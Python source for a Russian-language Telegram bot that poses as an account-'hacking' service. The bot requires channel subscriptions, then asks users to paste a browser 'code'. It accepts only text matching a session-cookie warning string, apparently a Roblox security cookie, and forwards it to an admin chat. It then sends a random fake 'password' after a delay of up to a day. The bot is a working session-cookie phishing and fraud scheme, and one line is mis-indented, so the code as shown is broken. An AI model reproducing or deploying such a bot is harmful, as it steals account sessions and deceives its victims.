import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import threading
import random
import string
import time

TOKEN = 'ВАШ_ТОКЕН'
bot = telebot.TeleBot(TOKEN)

CHANNELS = ['КАНАЛ_ДЛЯ_ПОДПИСКИ', '2КАНАЛ']
PRIVATE_CHANNEL_ID = АЙДИ_ПРИВАТ_КАНАЛА_ДЛЯ_СБОРА_ЗАЯВОК_НА_ВСТУПЛЕНИЕ

CONFIRMED_USERS = set()
awaiting_code = set()
user_last_code = {}

ADMIN_CHAT_ID = АЙДИ_ЧАТА_КУДА_ПРИСЫЛАТЬ_СООБЩЕНИЯ

def load_confirmed_users():
    try:
        with open('confirmed_users.json', 'r') as file:
            return set(json.load(file))
    except FileNotFoundError:
        return set()

def save_confirmed_users():
    with open('confirmed_users.json', 'w') as file:
        json.dump(list(CONFIRMED_USERS), file)

CONFIRMED_USERS = load_confirmed_users()

def is_subscribed_or_requested(user_id):
    try:
        for channel in CHANNELS:
            member_status = bot.get_chat_member(channel, user_id).status
            if member_status not in ['member', 'creator', 'administrator']:
                return False
        private_status = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id).status
        if private_status in ['member', 'restricted', 'left']:
            return True
        return False
    except telebot.apihelper.ApiTelegramException as e:
        if "USER_NOT_PARTICIPANT" in str(e):
            return True
        print(f"Ошибка проверки подписки: {e}")
        return False

def send_random_code(user_id):
    delay = random.randint(60, 86400)
    time.sleep(delay)
    random_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    bot.send_message(user_id, f"Пароль: {random_code}")

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.chat.id
    if user_id in CONFIRMED_USERS:
        bot.send_message(user_id, "Вы уже подтвердили подписку✅.\nИспользуйте команду /hack.")
        return

    markup = InlineKeyboardMarkup()
    for channel in CHANNELS:
        markup.add(InlineKeyboardButton("👉 Канал", url=f"https://t.me/{channel[1:]}"))
    markup.add(InlineKeyboardButton("👉Канал", url="https://t.me/+RIJvLBoxEddlYzBi"))
    markup.add(InlineKeyboardButton("Подтвердить ✅", callback_data='confirm_entry'))

    bot.send_message(
        user_id,
        "Чтобы пользоваться ботом:\n1️⃣ Подпишитесь на все каналы.\n2️⃣ Нажмите 'Подтвердить ✅'.",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'confirm_entry')
def confirm_entry(call):
    user_id = call.message.chat.id
    if is_subscribed_or_requested(user_id):
        CONFIRMED_USERS.add(user_id)
        save_confirmed_users()
        bot.answer_callback_query(call.id, "Подтверждено!")
        bot.send_message(user_id, "Вы подтвердили подписку ✅.\nТеперь можете использовать команду /hack.")
    else:
        bot.answer_callback_query(call.id, "Вы не подписаны на все каналы или ваша заявка отклонена.")
        bot.send_message(user_id, "Вы не подписаны на все каналы или ваша заявка отклонена❌.")

@bot.message_handler(commands=['hack'])
def hack_message(message):
    user_id = message.chat.id
    if user_id not in CONFIRMED_USERS:
        markup = InlineKeyboardMarkup()
        for channel in CHANNELS:
            markup.add(InlineKeyboardButton("👉 Канал", url=f"https://t.me/{channel[1:]}"))
        markup.add(InlineKeyboardButton("👉Канал", url="https://t.me/+RIJvLBoxEddlYzBi"))
        markup.add(InlineKeyboardButton("Подтвердить ✅", callback_data='confirm_entry'))

        bot.send_message(
            user_id,
            "Чтобы пользоваться ботом:\n1️⃣ Подпишитесь на все каналы.\n2️⃣ Нажмите 'Подтвердить ✅'.",
            reply_markup=markup
        )
        return

bot.send_message(user_id, "Введите код с браузера.\nЕсли вам непонятно, нажмите /help.")
    awaiting_code.add(user_id)

@bot.message_handler(commands=['help'])
def help_message(message):
    user_id = message.chat.id
    bot.send_message(user_id, "Посмотрите видеоинструкцию по ссылке: (ссылка)")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.chat.id
    if user_id in awaiting_code:
        if message.text.startswith('/help'):
            help_message(message)
            return

        if '_|' in message.text or 'WARNING:-DO-NOT-SHARE-THIS' in message.text:
            last_4_chars = message.text[-4:]
            if user_id in user_last_code and user_last_code[user_id] == last_4_chars:
                bot.send_message(user_id, "Код сброшен, взлом отменен❌.\nПерезайдите на аккаунт и повторите операцию /hack.")
                awaiting_code.remove(user_id)
            else:
                user_last_code[user_id] = last_4_chars
                bot.send_message(user_id, "Код введен верно, не обновляйте страницу браузера и ожидайте пароль✅.\nОжидание может занять до 1 дня.")
                bot.send_message(ADMIN_CHAT_ID, f"Пользователь {user_id} отправил код:\n{message.text}")
                threading.Thread(target=send_random_code, args=(user_id,)).start()
        else:
            bot.send_message(user_id, "Неверный код❌.\nИспользуйте команду /hack заново.")
    else:
        if message.text.startswith('/help'):
            help_message(message)
        else:
            bot.send_message(user_id, "Сначала используйте команду /hack.")

bot.polling(none_stop=True)
